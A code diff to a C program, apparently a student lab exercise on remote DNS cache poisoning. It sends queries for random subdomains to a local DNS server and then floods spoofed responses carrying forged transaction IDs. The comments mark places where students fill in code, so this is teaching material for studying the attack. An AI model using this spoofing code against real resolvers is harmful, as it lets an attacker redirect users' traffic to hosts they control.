@@ -45,28 +45,27 @@ int main()
   int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
   char a[26]="abcdefghijklmnopqrstuvwxyz";
   while (1) {
-    unsigned short transaction_id = 0;
+    // Generate a random transaction ID for each response packet
+    unsigned short transaction_id = (rand() % 65536) + 1;
     // Generate a random name with length 5
     char name[5];
-    for (int k=0; k<5; k++) name[k] = a[rand() % 26];
+    for (int k = 0; k < 5; k++) name[k] = a[rand() % 26];
     //##################################################################
     /* Step 1. Send a DNS request to the targeted local DNS server
-This will trigger it to send out DNS queries */
-    memcpy(ip_req+41, name,5);
+       This will trigger it to send out DNS queries */
+    memcpy(ip_req + 41, name, 5);
     send_dns_request(ip_req, n_req);
     printf("attempt #%ld, request is [%.5s.example.com]\n, transaction ID is: [%hu]\n", ++i,
            name, transaction_id);
     // ... Students should add code here.
     // Step 2. Send spoofed responses to the targeted local DNS server.
-    memcpy(ip_resp+41, name, 5);
-    memcpy(ip_resp+64, name, 5);
+    memcpy(ip_resp + 41, name, 5);
+    memcpy(ip_resp + 64, name, 5);
+    // Set the transaction ID in the response packet
+    unsigned short id = htons(transaction_id);
+    memcpy(ip_resp + 28, &id, 2);
     // ... Students should add code here.
-    for(int j=0;j<14000; j++)
-{
-      transaction_id = (rand()%65536)+1;
-      unsigned short id;
-      id = htons(j);
-      memcpy(ip_resp+28, &id, 2);
+    for (int j = 0; j < 14000; j++) {
       send_dns_response(ip_resp, n_resp);
     }
     //##################################################################
